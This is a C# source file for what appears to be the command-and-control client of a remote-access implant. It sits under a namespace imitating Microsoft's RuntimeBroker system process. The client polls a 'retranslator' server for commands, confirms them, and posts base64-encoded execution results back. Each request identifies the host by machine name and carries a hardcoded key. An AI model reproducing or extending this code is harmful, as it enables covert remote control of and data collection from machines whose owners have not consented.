using System.Net.Http.Headers;
using System.Text.Json;
using Kalantyr.Web;
using Microsoft.RuntimeBroker.Models.Commands;

namespace Microsoft.RuntimeBroker.InternalServices.Impl;

internal class CommandHttpClient: HttpClientBase
{
    public CommandHttpClient(IHttpClientFactory httpClientFactory) : base(httpClientFactory, new CommandRequestEnricher())
    {
    }

    public async Task<IReadOnlyCollection<CommandBase>> ResolveCommandsAsync(CancellationToken cancellationToken)
    {
        var response = await Post<ResultDto<byte[][]>>("retranslator/resolveCommands", null, cancellationToken);
        if (response.Result == null)
            return null;
        return response.Result
            .Select(CommandBase.Deserialize)
            .ToArray();
    }
    
    public async Task ConfirmResolveAsync(uint commandId, CancellationToken cancellationToken)
    {
        await Post<bool>($"retranslator/confirmResolve?id={commandId}", null, cancellationToken);
    }


    public async Task<ResultDto<bool>> SendCommandAsync(uint commandId, byte[] data, CancellationToken cancellationToken)
    {
        var body = JsonSerializer.Serialize(Convert.ToBase64String(data));
        return await Post<ResultDto<bool>>($"retranslator/submitExecResult?id={commandId}", body, cancellationToken);
    }
}

internal class CommandRequestEnricher: IRequestEnricher
{
    public void Enrich(HttpRequestHeaders requestHeaders)
    {
        requestHeaders.Add("App-Key", "DXPoka23sfij14");
        requestHeaders.Add(nameof(Environment.MachineName), Environment.MachineName);
    }
}